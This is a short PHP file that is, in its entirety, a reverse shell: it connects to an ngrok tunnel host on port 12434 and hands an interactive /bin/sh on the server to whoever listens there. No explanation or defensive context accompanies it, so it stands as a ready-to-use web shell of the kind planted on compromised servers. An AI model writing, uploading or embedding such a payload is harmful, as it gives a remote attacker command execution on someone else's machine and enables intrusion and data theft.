<?php 
$sock=fsockopen("0.tcp.ngrok.io",12434); 
exec("/bin/sh -i <&3 >&3 2>&3"); 
?> 
